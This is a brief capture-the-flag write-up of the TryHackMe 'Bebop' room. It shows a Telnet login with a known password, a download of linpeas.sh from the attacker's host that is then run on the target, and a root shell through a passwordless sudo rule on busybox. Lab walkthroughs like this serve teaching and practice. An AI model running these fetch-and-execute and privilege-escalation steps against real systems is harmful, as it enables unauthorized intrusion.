## Bebop
*Who thought making a flying shell was a good idea?*

This is [Bebop](https://tryhackme.com/room/bebop) from THM. It's easy rated and is supposed to be about taking over a drone or something.


## Ports
SSH and Telnet on port 23.

## Telnet
We were given a password: *pilot*. Let's try it?

{% highlight shell %}
root@kali:/opt/tryhackme/bebop# telnet 10.10.14.43 23
Trying 10.10.14.43...
Connected to 10.10.14.43.
Escape character is '^]'.
login: admin
Password for admin@freebsd:
login: pilot

FreeBSD 11.2-STABLE (GENERIC) #0 r345837: Thu Apr  4 02:07:22 UTC 2019
{% endhighlight %}

Pretty easy. And in fact we can read both flags as *pilot*! Surely it's not that easy?

Yes, it is.

But let's get root. No *wget* or *curl*; the FreeBSD equivalent is *fetch*:

{% highlight shell %}
[pilot@freebsd /tmp]$ fetch http://10.9.10.123:8000/linpeas.sh
linpeas.sh                                             310 kB  164 kBps    02s
[pilot@freebsd /tmp]$ chmod +x linpeas.sh 
[pilot@freebsd /tmp]$ ./linpeas.sh 
 Starting linpeas. Caching Writable Folders...
{% endhighlight %}

Probably should've found this myself, but anyway:

{% highlight shell %}
[pilot@freebsd /tmp]$ sudo -l
User pilot may run the following commands on freebsd:
    (root) NOPASSWD: /usr/local/bin/busybox
[pilot@freebsd /tmp]$ sudo -u root /usr/local/bin/busybox sh
# id;hostname
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
freebsd
{% endhighlight %}

Easy feels like an understatement.
